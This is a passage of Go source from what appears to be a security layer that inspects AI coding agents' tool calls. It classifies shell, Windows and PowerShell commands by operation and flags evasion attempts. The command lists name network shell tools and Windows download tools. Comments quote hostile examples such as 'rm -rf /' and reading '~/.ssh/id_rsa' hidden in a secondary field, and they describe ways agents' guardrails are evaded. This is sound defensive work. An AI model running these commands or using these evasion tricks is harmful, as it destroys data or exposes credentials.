		"trash":     {Operation: OpDelete, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"trash-put": {Operation: OpDelete, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},

		// GNOME/desktop trash
		"gio":        {Operation: OpDelete, PathArgIndex: []int{1, 2, 3}},
		"gvfs-trash": {Operation: OpDelete, PathArgIndex: []int{0, 1, 2, 3}},

		// User/group deletion
		"userdel":  {Operation: OpDelete, PathArgIndex: []int{0}},
		"groupdel": {Operation: OpDelete, PathArgIndex: []int{0}},

		// Windows delete
		"del":   {Operation: OpDelete, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"erase": {Operation: OpDelete, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"rd":    {Operation: OpDelete, PathArgIndex: []int{0, 1, 2}},

		// ===========================================
		// COPY OPERATIONS
		// ===========================================
		"cp":       {Operation: OpCopy, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"scp":      {Operation: OpCopy, PathArgIndex: []int{0, 1}},
		"rsync":    {Operation: OpCopy, PathArgIndex: []int{0, 1, 2, 3, 4, 5}},
		"dd":       {Operation: OpCopy, PathFlags: []string{"if=", "of="}},
		"ditto":    {Operation: OpCopy, PathArgIndex: []int{0, 1}},       // macOS advanced copy
		"robocopy": {Operation: OpCopy, PathArgIndex: []int{0, 1, 2, 3}}, // Windows
		"xcopy":    {Operation: OpCopy, PathArgIndex: []int{0, 1}},       // Windows
		"copy":     {Operation: OpCopy, PathArgIndex: []int{0, 1}},       // Windows

		// ===========================================
		// MOVE OPERATIONS
		// ===========================================
		"mv":     {Operation: OpMove, PathArgIndex: []int{0, 1}},
		"move":   {Operation: OpMove, PathArgIndex: []int{0, 1}}, // Windows
		"ren":    {Operation: OpMove, PathArgIndex: []int{0, 1}}, // Windows rename
		"rename": {Operation: OpMove, PathArgIndex: []int{0, 1}},

		// ===========================================
		// NETWORK OPERATIONS
		// ===========================================
		"curl":     {Operation: OpNetwork, PathArgIndex: []int{0}, PathFlags: []string{"-o", "--output"}},
		"wget":     {Operation: OpNetwork, PathArgIndex: []int{0}, PathFlags: []string{"-O", "--output-document", "--post-file", "--body-file"}},
		"nc":       {Operation: OpNetwork, PathArgIndex: []int{0}},
		"netcat":   {Operation: OpNetwork, PathArgIndex: []int{0}},
		"ssh":      {Operation: OpNetwork, PathArgIndex: []int{0}},
		"sftp":     {Operation: OpNetwork, PathArgIndex: []int{0}},
		"ftp":      {Operation: OpNetwork, PathArgIndex: []int{0}},
		"telnet":   {Operation: OpNetwork, PathArgIndex: []int{0}},
		"nmap":     {Operation: OpNetwork, PathArgIndex: []int{0, 1, 2, 3}},
		"ping":     {Operation: OpNetwork, PathArgIndex: []int{0}},
		"dig":      {Operation: OpNetwork, PathArgIndex: []int{0}},
		"nslookup": {Operation: OpNetwork, PathArgIndex: []int{0}},
		"socat":    {Operation: OpRead, PathArgIndex: []int{0, 1}}, // can read files (socat - /path) and network
		"ncat":     {Operation: OpNetwork, PathArgIndex: []int{0}},
		"aria2c":   {Operation: OpNetwork, PathArgIndex: []int{0}},
		"http":     {Operation: OpNetwork, PathArgIndex: []int{0, 1, 2}},
		"whois":    {Operation: OpNetwork, PathArgIndex: []int{0}},

		// Credential/cloud tools (can expose secrets via network)
		"git":     {Operation: OpNetwork, PathArgIndex: []int{1, 2, 3}},
		"docker":  {Operation: OpExecute, PathArgIndex: []int{1, 2, 3}},
		"kubectl": {Operation: OpNetwork, PathArgIndex: []int{1, 2, 3}},
		"aws":     {Operation: OpNetwork, PathArgIndex: []int{2, 3, 4}},
		"gcloud":  {Operation: OpNetwork, PathArgIndex: []int{2, 3, 4}},
		"az":      {Operation: OpNetwork, PathArgIndex: []int{2, 3, 4}},

		// ===========================================
		// EXECUTE OPERATIONS
		// ===========================================
		"bash":    {Operation: OpExecute, PathArgIndex: []int{0}},
		"sh":      {Operation: OpExecute, PathArgIndex: []int{0}},
		"zsh":     {Operation: OpExecute, PathArgIndex: []int{0}},
		"dash":    {Operation: OpExecute, PathArgIndex: []int{0}},
		"ksh":     {Operation: OpExecute, PathArgIndex: []int{0}},
		"csh":     {Operation: OpExecute, PathArgIndex: []int{0}},
		"tcsh":    {Operation: OpExecute, PathArgIndex: []int{0}},
		"fish":    {Operation: OpExecute, PathArgIndex: []int{0}},
		"python":  {Operation: OpExecute, PathArgIndex: []int{0}},
		"python2": {Operation: OpExecute, PathArgIndex: []int{0}},
		"python3": {Operation: OpExecute, PathArgIndex: []int{0}},
		"node":    {Operation: OpExecute, PathArgIndex: []int{0}},
		"ruby":    {Operation: OpExecute, PathArgIndex: []int{0}},
		"perl":    {Operation: OpExecute, PathArgIndex: []int{0}},
		"php":     {Operation: OpExecute, PathArgIndex: []int{0}},
		"lua":     {Operation: OpExecute, PathArgIndex: []int{0}},
		"luajit":  {Operation: OpExecute, PathArgIndex: []int{0}},
		"tclsh":   {Operation: OpExecute, PathArgIndex: []int{0}},
		"wish":    {Operation: OpExecute, PathArgIndex: []int{0}},
		"Rscript": {Operation: OpExecute, PathArgIndex: []int{0}},

		// Indirect execution
		"xargs":  {Operation: OpExecute, PathArgIndex: []int{0, 1, 2}},
		"find":   {Operation: OpExecute, PathArgIndex: []int{0}, PathFlags: []string{"-exec", "-execdir"}},
		"eval":   {Operation: OpExecute, PathArgIndex: []int{0}},
		"source": {Operation: OpExecute, PathArgIndex: []int{0}},
		".":      {Operation: OpExecute, PathArgIndex: []int{0}}, // source alias
		"make":   {Operation: OpExecute, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-f", "--file", "-C", "--directory"}},

		// Additional runtimes
		"npx":    {Operation: OpExecute, PathArgIndex: []int{0, 1, 2}},
		"bun":    {Operation: OpExecute, PathArgIndex: []int{0}},
		"deno":   {Operation: OpExecute, PathArgIndex: []int{0, 1}},
		"swift":  {Operation: OpExecute, PathArgIndex: []int{0}},
		"java":   {Operation: OpExecute, PathArgIndex: []int{0, 1, 2}},
		"julia":  {Operation: OpExecute, PathArgIndex: []int{0}},
		"elixir": {Operation: OpExecute, PathArgIndex: []int{0}},
		"expect": {Operation: OpExecute, PathArgIndex: []int{0}},
		"erl":    {Operation: OpExecute, PathArgIndex: []int{0}},
		"groovy": {Operation: OpExecute, PathArgIndex: []int{0}},
		"scala":  {Operation: OpExecute, PathArgIndex: []int{0}},
		"kotlin": {Operation: OpExecute, PathArgIndex: []int{0}},

		// Windows shells and LOLBAS
		// -Command/-EncodedCommand are handled by the dedicated PowerShell handler
		// in extractFromParsedCommandsDepth (not as PathFlags). Only -File remains
		// as a PathFlag since it genuinely takes a file path.
		"powershell":     {Operation: OpExecute, PathFlags: []string{"-File"}, SkipFlags: []string{"-NoProfile", "-NonInteractive", "-NoLogo", "-ExecutionPolicy", "-WindowStyle", "-OutputFormat", "-InputFormat"}},
		"powershell.exe": {Operation: OpExecute, PathFlags: []string{"-File"}, SkipFlags: []string{"-NoProfile", "-NonInteractive", "-NoLogo", "-ExecutionPolicy", "-WindowStyle", "-OutputFormat", "-InputFormat"}},
		"pwsh":           {Operation: OpExecute, PathFlags: []string{"-File"}, SkipFlags: []string{"-NoProfile", "-NonInteractive", "-NoLogo", "-ExecutionPolicy", "-WindowStyle", "-OutputFormat", "-InputFormat"}},
		"pwsh.exe":       {Operation: OpExecute, PathFlags: []string{"-File"}, SkipFlags: []string{"-NoProfile", "-NonInteractive", "-NoLogo", "-ExecutionPolicy", "-WindowStyle", "-OutputFormat", "-InputFormat"}},
		"cmd.exe":        {Operation: OpExecute, PathArgIndex: []int{0}},
		"mshta":          {Operation: OpExecute, PathArgIndex: []int{0}},
		"cscript":        {Operation: OpExecute, PathArgIndex: []int{0}},
		"wscript":        {Operation: OpExecute, PathArgIndex: []int{0}},
		"msiexec":        {Operation: OpExecute, PathArgIndex: []int{0, 1}, PathFlags: []string{"/i", "/p", "/a"}},
		"wmic":           {Operation: OpExecute, PathArgIndex: []int{0, 1, 2, 3}},
		"certutil":       {Operation: OpWrite, PathArgIndex: []int{0, 1, 2, 3}}, // LOLBAS: download+write
		"bitsadmin":      {Operation: OpNetwork, PathArgIndex: []int{0, 1, 2, 3}},
		"osascript":      {Operation: OpExecute, PathArgIndex: []int{0}}, // macOS AppleScript

		// Windows file operations
		"type":     {Operation: OpRead, PathArgIndex: []int{0, 1, 2}}, // Windows cat equivalent
		"attrib":   {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}},
		"icacls":   {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}},
		"cacls":    {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}},
		"takeown":  {Operation: OpWrite, PathArgIndex: []int{0, 1}, PathFlags: []string{"/F", "/D"}},
		"mklink":   {Operation: OpWrite, PathArgIndex: []int{0, 1}},
		"cipher":   {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}},
		"compact":  {Operation: OpWrite, PathArgIndex: []int{0, 1, 2}},
		"fsutil":   {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}},
		"diskpart": {Operation: OpWrite, PathArgIndex: []int{}},
		"format":   {Operation: OpWrite, PathArgIndex: []int{0}},
		"regedit":  {Operation: OpWrite, PathArgIndex: []int{0}},
		"reg":      {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}},
		"sc":       {Operation: OpWrite, PathArgIndex: []int{1, 2, 3}},
		"schtasks": {Operation: OpExecute, PathArgIndex: []int{0, 1, 2}},
		"forfiles": {Operation: OpExecute, PathArgIndex: []int{0, 1}, PathFlags: []string{"/P", "/M", "/C"}},

		// Scheduled task commands
		"crontab": {Operation: OpExecute, PathArgIndex: []int{}},
		"at":      {Operation: OpExecute, PathArgIndex: []int{}},

		// ===========================================
		// SYMLINK OPERATIONS (important for bypass detection)
		// ===========================================
		"ln":       {Operation: OpWrite, PathArgIndex: []int{0, 1}},
		"readlink": {Operation: OpRead, PathArgIndex: []int{0}},

		// ===========================================
		// POWERSHELL CMDLETS
		// ===========================================
		// PowerShell cmdlet names (e.g. "Get-Content") are valid POSIX command
		// names (hyphens allowed), so the Bash parser captures them as-is.
		// PathFlags use PowerShell named parameters (-Path, -LiteralPath, etc.).
		// Covers both full cmdlet names and common aliases not already in DB.

		// Read operations
		"Get-Content":      {Operation: OpRead, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-Path", "-LiteralPath"}},
		"gc":               {Operation: OpRead, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-Path", "-LiteralPath"}},
		"Get-ChildItem":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-Path", "-LiteralPath", "-Filter"}},
		"gci":              {Operation: OpRead, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-Path", "-LiteralPath", "-Filter"}},
		"dir":              {Operation: OpRead, PathArgIndex: []int{0, 1, 2}},
		"Select-String":    {Operation: OpRead, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-Path", "-LiteralPath", "-Pattern"}},
		"sls":              {Operation: OpRead, PathArgIndex: []int{0, 1, 2}, PathFlags: []string{"-Path", "-LiteralPath"}},
		"Get-ItemProperty": {Operation: OpRead, PathArgIndex: []int{0}, PathFlags: []string{"-Path", "-LiteralPath"}},
		"Test-Path":        {Operation: OpRead, PathArgIndex: []int{0}, PathFlags: []string{"-Path", "-LiteralPath"}},
		"Import-Csv":       {Operation: OpRead, PathArgIndex: []int{0}, PathFlags: []string{"-Path", "-LiteralPath"}},
		"Get-Acl":          {Operation: OpRead, PathArgIndex: []int{0}, PathFlags: []string{"-Path"}},
		"Get-FileHash":     {Operation: OpRead, PathArgIndex: []int{0}, PathFlags: []string{"-Path", "-LiteralPath"}},
		"Import-Clixml":    {Operation: OpRead, PathArgIndex: []int{0}, PathFlags: []string{"-Path", "-LiteralPath"}},
		"ConvertFrom-Json": {Operation: OpRead, PathArgIndex: []int{0}},

		// Write operations
		"Set-Content":      {Operation: OpWrite, PathArgIndex: []int{0, 1}, PathFlags: []string{"-Path", "-LiteralPath", "-Value"}},
		"Add-Content":      {Operation: OpWrite, PathArgIndex: []int{0, 1}, PathFlags: []string{"-Path", "-LiteralPath", "-Value"}},
		"ac":               {Operation: OpWrite, PathArgIndex: []int{0, 1}, PathFlags: []string{"-Path", "-LiteralPath"}},
		"Out-File":         {Operation: OpWrite, PathArgIndex: []int{0}, PathFlags: []string{"-FilePath", "-LiteralPath"}},
		"New-Item":         {Operation: OpWrite, PathArgIndex: []int{0}, PathFlags: []string{"-Path", "-Name", "-ItemType"}},
		"ni":               {Operation: OpWrite, PathArgIndex: []int{0}, PathFlags: []string{"-Path", "-Name"}},
		"Set-ItemProperty": {Operation: OpWrite, PathArgIndex: []int{0}, PathFlags: []string{"-Path", "-LiteralPath"}},
		"Clear-Content":    {Operation: OpWrite, PathArgIndex: []int{0}, PathFlags: []string{"-Path", "-LiteralPath"}},
		"clc":              {Operation: OpWrite, PathArgIndex: []int{0}, PathFlags: []string{"-Path", "-LiteralPath"}},
		"Export-Csv":       {Operation: OpWrite, PathArgIndex: []int{0}, PathFlags: []string{"-Path", "-LiteralPath"}},
		"Export-Clixml":    {Operation: OpWrite, PathArgIndex: []int{0}, PathFlags: []string{"-Path", "-LiteralPath"}},
		"Set-Acl":          {Operation: OpWrite, PathArgIndex: []int{0}, PathFlags: []string{"-Path"}},
		"Compress-Archive": {Operation: OpWrite, PathArgIndex: []int{0, 1}, PathFlags: []string{"-Path", "-DestinationPath", "-LiteralPath"}},
		"Expand-Archive":   {Operation: OpWrite, PathArgIndex: []int{0}, PathFlags: []string{"-Path", "-DestinationPath", "-LiteralPath"}},

		// Delete operations
		"Remove-Item":         {Operation: OpDelete, PathArgIndex: []int{0, 1, 2, 3}, PathFlags: []string{"-Path", "-LiteralPath"}},
		"ri":                  {Operation: OpDelete, PathArgIndex: []int{0, 1, 2, 3}, PathFlags: []string{"-Path", "-LiteralPath"}},
		"Clear-Item":          {Operation: OpDelete, PathArgIndex: []int{0}, PathFlags: []string{"-Path", "-LiteralPath"}},
		"Remove-ItemProperty": {Operation: OpDelete, PathArgIndex: []int{0}, PathFlags: []string{"-Path", "-LiteralPath"}},

		// Copy operations
		"Copy-Item": {Operation: OpCopy, PathArgIndex: []int{0, 1}, PathFlags: []string{"-Path", "-Destination", "-LiteralPath"}},
		"ci":        {Operation: OpCopy, PathArgIndex: []int{0, 1}, PathFlags: []string{"-Path", "-Destination", "-LiteralPath"}},

		// Move operations
		"Move-Item":   {Operation: OpMove, PathArgIndex: []int{0, 1}, PathFlags: []string{"-Path", "-Destination", "-LiteralPath"}},
		"mi":          {Operation: OpMove, PathArgIndex: []int{0, 1}, PathFlags: []string{"-Path", "-Destination", "-LiteralPath"}},
		"Rename-Item": {Operation: OpMove, PathArgIndex: []int{0}, PathFlags: []string{"-Path", "-NewName", "-LiteralPath"}},
		"rni":         {Operation: OpMove, PathArgIndex: []int{0}, PathFlags: []string{"-Path", "-NewName"}},

		// Network operations
		"Invoke-WebRequest":  {Operation: OpNetwork, PathArgIndex: []int{0}, PathFlags: []string{"-Uri", "-OutFile"}},
		"iwr":                {Operation: OpNetwork, PathArgIndex: []int{0}, PathFlags: []string{"-Uri", "-OutFile"}},
		"Invoke-RestMethod":  {Operation: OpNetwork, PathArgIndex: []int{0}, PathFlags: []string{"-Uri", "-OutFile"}},
		"irm":                {Operation: OpNetwork, PathArgIndex: []int{0}, PathFlags: []string{"-Uri", "-OutFile"}},
		"Send-MailMessage":   {Operation: OpNetwork, PathArgIndex: []int{0}, PathFlags: []string{"-To", "-From", "-SmtpServer", "-Attachments"}},
		"Test-NetConnection": {Operation: OpNetwork, PathArgIndex: []int{0}, PathFlags: []string{"-ComputerName", "-Port"}},
		"Resolve-DnsName":    {Operation: OpNetwork, PathArgIndex: []int{0}},

		// Execute operations
		"Invoke-Expression":      {Operation: OpExecute, PathArgIndex: []int{0}, PathFlags: []string{"-Command"}},
		"iex":                    {Operation: OpExecute, PathArgIndex: []int{0}},
		"Start-Process":          {Operation: OpExecute, PathArgIndex: []int{0}, PathFlags: []string{"-FilePath", "-ArgumentList"}},
		"saps":                   {Operation: OpExecute, PathArgIndex: []int{0}, PathFlags: []string{"-FilePath"}},
		"Invoke-Command":         {Operation: OpExecute, PathArgIndex: []int{0}, PathFlags: []string{"-ScriptBlock", "-FilePath", "-ComputerName"}},
		"icm":                    {Operation: OpExecute, PathArgIndex: []int{0}, PathFlags: []string{"-ScriptBlock", "-FilePath"}},
		"Import-Module":          {Operation: OpExecute, PathArgIndex: []int{0}, PathFlags: []string{"-Name"}},
		"ipmo":                   {Operation: OpExecute, PathArgIndex: []int{0}, PathFlags: []string{"-Name"}},
		"Register-ScheduledTask": {Operation: OpExecute, PathArgIndex: []int{0}},
		"Start-Job":              {Operation: OpExecute, PathArgIndex: []int{0}, PathFlags: []string{"-ScriptBlock", "-FilePath"}},
	}
}

// Extract extracts info from a tool call
func (e *Extractor) Extract(toolName string, args json.RawMessage) ExtractedInfo {
	info := ExtractedInfo{
		RawArgs: make(map[string]any),
	}

	// Parse the raw args
	if err := json.Unmarshal(args, &info.RawArgs); err != nil {
		info.Content = string(args)
		return info
	}

	// SECURITY: Re-marshal decoded args for content matching.
	// json.Unmarshal decodes \uXXXX escapes → actual chars, then json.Marshal
	// writes them back as plain text. This prevents bypassing content-only rules
	// by encoding "localhost" as "\u006c\u006f\u0063\u0061\u006c\u0068\u006f\u0073\u0074".
	if normalized, err := json.Marshal(info.RawArgs); err == nil {
		info.Content = string(normalized)
		info.RawJSON = string(normalized)
	} else {
		info.Content = string(args)
		info.RawJSON = string(args)
	}

	// SECURITY: Normalize field names to canonical form (lowercase, no underscores/hyphens).
	// JSON keys are case-sensitive, so {"Command": "rm -rf /"} would bypass
	// detection if we only check lowercase field names. Additionally, different agents
	// use different naming conventions (snake_case: Cursor, PascalCase: Windsurf).
	// Normalizing once here makes "target_file", "TargetFile", "targetFile" all equivalent.
	// On collision (e.g., "command" and "Command" both present), merge values
	// into []any so ALL values are analyzed — Go map iteration is nondeterministic,
	// so a simple overwrite would randomly lose one value.
	lowered := make(map[string]any, len(info.RawArgs))
	for k, v := range info.RawArgs {
		lk := normalizeFieldName(k)
		if existing, ok := lowered[lk]; ok {
			switch arr := existing.(type) {
			case []any:
				lowered[lk] = append(arr, v)
			default:
				lowered[lk] = []any{arr, v}
			}
		} else {
			lowered[lk] = v
		}
	}
	info.RawArgs = lowered

	// Normalize tool name for comparison
	toolLower := strings.ToLower(toolName)

	// Layer 1: name-based extraction (fast path for known tools).
	// Tool names from: Claude Code, Codex CLI, OpenCode, OpenClaw, Cline, Cursor, Windsurf Cascade.
	switch toolLower {
	case "bash", "exec",
		"shell",            // Codex CLI
		"run_terminal_cmd", // Cursor
		"run_command",      // Windsurf
		"execute_command":  // Cline
		e.extractBashCommand(&info)
	case "read", "read_file",
		"view_line_range",            // Windsurf
		"view_file_outline",          // Windsurf
		"view_code_item",             // Windsurf
		"search_in_file",             // Windsurf
		"search_files",               // Cline
		"list_files",                 // Cline
		"list_code_definition_names", // Cline
		"codebase_search",            // Cursor
		"grep_search",                // Cursor
		"file_search",                // Cursor
		"list_dir":                   // Cursor / Codex
		e.extractReadTool(&info)
	case "write", "write_file",
		"write_to_file", // Cline / Windsurf
		"apply_patch",   // OpenClaw / Cursor
		"applypatch",    // Cursor (ApplyPatch → applypatch after lowering)
		"patch":         // OpenCode
		e.extractWriteTool(&info)
	case "edit", "edit_file", // Cursor / Windsurf
		"multiedit",       // Claude Code
		"replace_in_file": // Cline
		e.extractEditTool(&info)
	case "delete_file": // Cursor
		e.extractDeleteTool(&info)
	case "webfetch", "web_fetch", "websearch", "web_search", "browser",
		"read_url_content",                // Windsurf
		"view_web_document_content_chunk", // Windsurf
		"browser_preview",                 // Windsurf
		"search_web",                      // Windsurf
		"browser_action":                  // Cline
		e.extractWebFetchTool(&info)
	default:
		// Unknown tool — try shell AST parsing on any command-like field first,
		// then fall back to shape-based detection for paths/urls/content.
		e.extractUnknownTool(&info)
	}

	// Layer 2: shape-based augmentation (always runs, never downgrades)
	// Catches renamed tools, hidden fields, and MCP tools with standard arg shapes.
	e.augmentFromArgShape(&info)

	return info
}

// minPrinter reconstructs shell commands in canonical minified form.
// Used to produce a normalized info.Command for rule matching.
var minPrinter = syntax.NewPrinter(syntax.Minify(true))

// extractBashCommand parses a bash command and extracts paths/operation.
func (e *Extractor) extractBashCommand(info *ExtractedInfo) {
	// Collect ALL command field values — not just the first.
	// An attacker could hide a dangerous command in a secondary field
	// (e.g., "command": "echo safe", "shell": "cat ~/.ssh/id_rsa").
	// Handles both string values and []any arrays (from case-collision
	// merging or original JSON arrays like "command": ["cmd1", "cmd2"]).
	var cmds []string
	for _, field := range knownCommandFields {
		if val, ok := info.RawArgs[field]; ok {
			cmds = append(cmds, fieldStrings(val)...)
		}
	}
	if len(cmds) == 0 {
		return
	}

	// Parse each command once, then reuse the AST for both minPrinting and
	// Runner execution. Only mark evasive if NO field parsed successfully —
	// a secondary field may contain non-shell text (e.g., "script": "...").
	parser := syntax.NewParser(syntax.KeepComments(false), syntax.Variant(syntax.LangBash))
	anyParsed := false
	anyFailed := false
	var printed []string
	for _, cmd := range cmds {
		if strings.TrimSpace(cmd) == "" {
			continue
		}

		// Check raw input for evasion patterns BEFORE parsing — the AST
		// printer strips null bytes and normalizes control chars, so
		// checking the printed output would miss these.
		if suspicious, reasons := IsSuspiciousInput(cmd); suspicious {
			info.Evasive = true
			info.EvasiveReason = "suspicious input: " + strings.Join(reasons, ", ")
		}

		// Pre-process PowerShell commands before bash parsing:
		// 1. Substitute $var references with their assigned values
		// 2. Normalize Windows backslash paths to forward slashes
		// This prevents the bash parser from mangling PS-specific syntax.
		if looksLikePowerShell(cmd) {
			cmd = substitutePSVariables(cmd)
			cmd = normalizePSBackslashPaths(cmd)
		}

		file, err := parser.Parse(strings.NewReader(cmd), "")
		if err != nil {
			printed = append(printed, strings.TrimSpace(cmd))
			anyFailed = true
			continue
		}

		syntax.Simplify(file)

		// Canonical minified representation for info.Command / match.command rules.
		var buf bytes.Buffer
		if err := minPrinter.Print(&buf, file); err == nil {
			printed = append(printed, buf.String())
		} else {
			printed = append(printed, strings.TrimSpace(cmd))
		}

		// Run the shell interpreter to extract commands.
		// If subprocess isolation is enabled, delegate to the worker process
		// so that goroutine panics in the interpreter crash the worker instead
		// of the main process.
		var parsed []parsedCommand
		var symtab map[string]string
		var panicked bool
		if e.worker != nil {
			resp, crashed := e.worker.eval(shellWorkerRequest{Cmd: cmd, Env: e.env})
			if crashed {
				panicked = true
			} else {
				parsed = resp.Commands
				symtab = resp.Symtab
				panicked = resp.Panicked
			}
		} else {
			parsed, symtab, panicked = e.runShellFile(file, nil)
		}
		if len(parsed) > 0 {
			e.extractFromParsedCommandsDepth(info, parsed, 0, symtab)
			anyParsed = true
		} else if panicked || astHasSubst(file) {
			// Either the interpreter panicked (e.g., unhandled CoprocClause)
			// or it extracted zero commands from an AST with substitutions
			// (e.g., ProcSubst where FIFOs can't be created in dry-run mode).
			// Flag as evasive — we can't analyze what's inside.
			info.Evasive = true
			info.EvasiveReason = "command contains shell constructs that could not be analyzed"
			anyParsed = true // Prevent double-flag from the anyFailed check below
		}
	}

	// Build canonical info.Command from AST-printed representations
	info.Command = strings.Join(printed, ";")

	if anyFailed && !anyParsed {
		info.Evasive = true
		info.EvasiveReason = "command could not be parsed for security analysis"
	}
}

// shellInterpreters are commands that accept a -c flag with a shell command string
// to execute. When detected, we recursively parse the argument to -c.
var shellInterpreters = map[string]bool{
	"bash": true, "sh": true, "zsh": true, "dash": true, "ksh": true,
	// su passes -c to a shell, same semantics
	"su": true,
}

// powershellInterpreters are PowerShell executables whose -Command/-c/-EncodedCommand
// flags contain PowerShell code strings that must be recursively analyzed.
// Separate from shellInterpreters because inner code is PowerShell, not POSIX sh.
var powershellInterpreters = map[string]bool{
	"powershell": true, "powershell.exe": true,
	"pwsh": true, "pwsh.exe": true,
}

// isPowerShellCmdlet returns true if the command name follows PowerShell's
// Verb-Noun naming convention (e.g., Get-Content, Set-Content, Remove-Item).
// Used to scope case-insensitive flag matching to PS cmdlets only, avoiding
// accidental case-folding of POSIX flags like -F (cpio), -O (wget), -C (ninja).
func isPowerShellCmdlet(name string) bool {
	idx := strings.Index(name, "-")
	// Must have a hyphen that's not at the start or end, with letters on both sides
	return idx > 0 && idx < len(name)-1 && name[0] >= 'A' && name[0] <= 'Z'
}

// extractFlagValueCaseInsensitive returns the value following a flag matched
// case-insensitively. Used for PowerShell where -Command, -command, -COMMAND
// are all equivalent. Returns the value string, or "" if not found.
func extractFlagValueCaseInsensitive(args []string, flag string) string {
	lowerFlag := strings.ToLower(flag)
	for i, arg := range args {
		if strings.ToLower(arg) == lowerFlag && i+1 < len(args) {
			return args[i+1]
		}
	}
	return ""
}

// extractFlagRestCaseInsensitive returns all remaining args after a flag,
// joined with spaces. PowerShell -Command consumes everything after it.
func extractFlagRestCaseInsensitive(args []string, flag string) string {
	lowerFlag := strings.ToLower(flag)
	for i, arg := range args {
		if strings.ToLower(arg) == lowerFlag && i+1 < len(args) {
			return strings.Join(args[i+1:], " ")
		}
	}
	return ""
}

// decodePowerShellEncodedCommand decodes a PowerShell -EncodedCommand value.
// PowerShell encodes commands as base64 of UTF-16LE bytes.
// Returns the decoded string and true, or empty string and false on failure.
func decodePowerShellEncodedCommand(encoded string) (string, bool) {
	encoded = strings.Trim(encoded, `"'`)
	raw, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return "", false
	}
	if len(raw)%2 != 0 {
		return "", false
	}
	runes := make([]rune, 0, len(raw)/2)
	for i := 0; i < len(raw); i += 2 {
		r := rune(raw[i]) | rune(raw[i+1])<<8
		if r == 0 {
			break
		}
		runes = append(runes, r)
	}
	return string(runes), len(runes) > 0
}

// unquotedAbsPathRe matches unquoted absolute paths (Unix or Windows drive letter).
// Used as fallback when the bash parser can't handle PowerShell inner commands.
var unquotedAbsPathRe = regexp.MustCompile(`(?:/[a-zA-Z0-9_.~/-]+|[A-Z]:[/\\][a-zA-Z0-9_.~\\/:-]+)`)

// winBackslashPathRe matches Windows drive-letter paths and UNC paths with backslashes.
// Examples: C:\Users\user\.env, \\server\share\.env
var winBackslashPathRe = regexp.MustCompile(`(?:[A-Z]:\\|\\\\)(?:[a-zA-Z0-9_.~-]+\\)*[a-zA-Z0-9_.~*-]+`)

// psVarAssignRe matches PowerShell-style variable assignments: $varName = "value" or $varName = value
var psVarAssignRe = regexp.MustCompile(`\$([a-zA-Z_]\w*)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s;|]+))`)

// looksLikePowerShell returns true if the command string appears to contain
// PowerShell syntax: Verb-Noun cmdlets or PS-style $var= assignments.
func looksLikePowerShell(cmd string) bool {
	fields := strings.FieldsFunc(cmd, func(r rune) bool {
		return r == '|' || r == ';' || r == ' ' || r == '\t'
	})
	if slices.ContainsFunc(fields, isPowerShellCmdlet) {
		return true
	}
	return psVarAssignRe.MatchString(cmd)
}

// normalizePSBackslashPaths converts Windows backslash paths to forward slashes
// so the bash parser doesn't mangle them. Only called when the command looks like
// PowerShell. E.g., C:\Users\user\.env → C:/Users/user/.env
func normalizePSBackslashPaths(cmd string) string {
	return winBackslashPathRe.ReplaceAllStringFunc(cmd, func(match string) string {
		return strings.ReplaceAll(match, `\`, `/`)
	})
}

// substitutePSVariables finds PowerShell $var=value assignments and replaces
// subsequent $var references with the literal value. Handles simple sequential
// assignments; does not support scoping, conditionals, or string interpolation.
// Assignment sites ($var=...) are preserved; only bare $var references are replaced.
func substitutePSVariables(cmd string) string {
	matches := psVarAssignRe.FindAllStringSubmatch(cmd, -1)
	if len(matches) == 0 {
		return cmd
	}

	// Build symbol table from assignments (last assignment wins)
	symtab := make(map[string]string)
	for _, m := range matches {
		varName := m[1]
		var value string
		switch {
		case m[2] != "": // double-quoted
			value = m[2]
		case m[3] != "": // single-quoted
			value = m[3]
		default: // unquoted
			value = m[4]
		}
		symtab[varName] = value
	}

	// Replace $var references, skipping assignment sites.
	// Process right-to-left so index shifts don't affect earlier positions.
	for varName, value := range symtab {
		re := regexp.MustCompile(`\$` + regexp.QuoteMeta(varName) + `\b`)
		locs := re.FindAllStringIndex(cmd, -1)
		if locs == nil {
			continue
		}
		// Process in reverse order to preserve indices
		for i := len(locs) - 1; i >= 0; i-- {
			start, end := locs[i][0], locs[i][1]
			// Skip if followed by optional whitespace and '=' (assignment site)
			rest := cmd[end:]
			trimmed := strings.TrimLeft(rest, " \t")
			if len(trimmed) > 0 && trimmed[0] == '=' {
				continue
			}
			cmd = cmd[:start] + value + cmd[end:]
		}
	}
	return cmd
}

// inferPowerShellOperation scans a PowerShell command string for known cmdlet
// names and sets info.Operation to the most dangerous one found.
func (e *Extractor) inferPowerShellOperation(info *ExtractedInfo, cmd string) {
	segments := strings.FieldsFunc(cmd, func(r rune) bool {
		return r == '|' || r == ';'
	})
	for _, seg := range segments {
		fields := strings.Fields(strings.TrimSpace(seg))
		if len(fields) == 0 {
			continue
		}
		if ci, ok := e.commandDB[fields[0]]; ok {
			if operationPriority(ci.Operation) > operationPriority(info.Operation) {
				info.Operation = ci.Operation
			}
		}
	}
}

// parsePowerShellInnerCommand attempts to extract commands from a PowerShell
// code string. Tries the bash parser first (simple cmdlet calls parse as
// valid POSIX), then falls back to regex heuristics for paths and hosts.
//
// NOTE: PowerShell variables ($p, $env:HOME) are not expanded — the bash
// interpreter cannot resolve PS variable syntax. This is a known limitation.
func (e *Extractor) parsePowerShellInnerCommand(info *ExtractedInfo, innerCmd string, depth int, parentSymtab map[string]string) {
	innerCmd = strings.Trim(innerCmd, `"'`)
	if innerCmd == "" {
		return
	}

